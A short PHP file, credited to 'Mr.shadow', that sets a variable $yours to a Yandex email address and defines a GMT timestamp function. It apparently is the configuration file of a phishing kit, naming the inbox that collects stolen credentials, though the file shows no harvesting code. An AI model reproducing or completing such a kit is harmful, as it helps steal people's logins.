<?php
	/*
	/ -> All Created By Mr.shadow
	/ -> https://www.facebook.com/er.munt
	*/
	

	// ================================= //

	$yours = "popoimpo@yandex.com";
	// ================================= //


	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y h:i:sa");
	}

?>